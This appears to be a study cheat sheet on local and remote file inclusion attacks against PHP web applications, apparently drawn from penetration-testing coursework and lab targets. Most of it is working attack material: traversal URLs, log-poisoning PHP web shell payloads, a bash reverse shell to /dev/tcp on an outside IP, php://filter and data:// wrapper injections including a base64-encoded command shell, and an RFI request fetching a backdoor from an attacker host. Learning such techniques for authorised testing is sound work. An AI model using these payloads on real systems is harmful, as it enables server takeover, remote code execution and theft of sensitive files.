# File Inclusion

Execute local or remote files (while directory traversal only allows us to read the contents of a file).







## Local File Inclusion (LFI)
occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

Example LFI: `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`











### Log Poisoning

- Linux: /var/log/apache2/access.log
- Windows: C:\xampp\apache\logs\access.log

Payload to write in the log: `<?php echo system($_GET['cmd']); ?>`:
```
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

Then execute:
```
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
```


Once we have achieved command execution on the target system and can leverage this to get a reverse shell:
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"


bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```


or add our SSH key to the authorized_keys file for a user.
















### PHP Wrappers

This is a handy technique that may help us bypass basic filters. However, we need to be aware that the `data://` wrapper will not work in a default PHP installation. To exploit it, the `allow_url_include` setting needs to be enabled.





`php://filter` wrapper can be used to include the contents of a file.
`convert.base64-encode` converts the specified resource to a base64 string.

Example:
```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64- 
encode/resource=admin.php
```
Then use `base64 -d` to decode the encoded data.






`data://` wrapper to achieve code execution.
This wrapper is used to EMBED DATA ELEMENTS AS PLAINTEXT OR BASE64-ENCODED DATA IN THE RUNNING WEB APPLICATIONâ€™S CODE. This offers an alternative method when we cannot poison a local file with PHP code.

Example:
```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20sy stem('ls');?>"
```

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the `data://` wrapper with `base64-encoded` data. We'll first encode the PHP snippet into `base64`, then use curl to embed and execute it via the `data://` wrapper.

```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
# Output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl 
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
 NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

















## Remote File Inclusion (RFI)
Is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc

Example RFI: `http://unika.htb/index.php?page=//10.10.14.6/somefile`





RFI vulnerabilities are less common than LFI since the target system must be configured in a specific way. In PHP web applications, for example, the `allow_url_include` option needs to be enabled to leverage RFI (just as with the data:// wrapper case)

Common scenarios where we'll find this option enabled is when the web application
loads files or contents from remote systems e.g. libraries or application data.



Kali Linux includes several PHP webshells in the `/usr/share/webshells/php/` directory that can be used for RFI.

A webshell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands. 

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.
- `python3 -m http.server 80`
- use a publicly-accessible file, such as one from Github



```
curl "http://mountaindesserts.com/meteor/index.php?page=http://[ATTACKER IP]/simple-
backdoor.php&cmd=ls"
```








